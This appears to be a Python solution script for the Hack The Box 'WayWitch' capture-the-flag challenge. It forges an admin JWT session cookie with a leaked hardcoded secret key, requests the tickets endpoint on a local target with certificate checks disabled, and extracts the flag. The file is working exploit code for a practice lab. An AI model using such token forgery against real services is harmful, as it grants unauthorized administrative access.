#!/usr/bin/python3
# https://app.hackthebox.com/challenges/WayWitch
# Tags: JWT, leaked secret key

import jwt
import requests
import urllib3
import re

target = "127.0.0.1:1337"
secret_key = "halloween-secret"
payload = {
    "username": "admin"
}
token = jwt.encode(payload, secret_key, algorithm='HS256')
cookies = {
    "session_token": token
}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
response = requests.get(f"https://{target}/tickets", verify=False, cookies=cookies)
admin_ticket = next((item for item in response.json()["tickets"] if item["username"] == "admin"), None)
flag = re.search(r'HTB\{.*?\}', admin_ticket["content"])

print(f"[\u2714] Flag captured: \033[1;37m{flag.group()}\033[0m")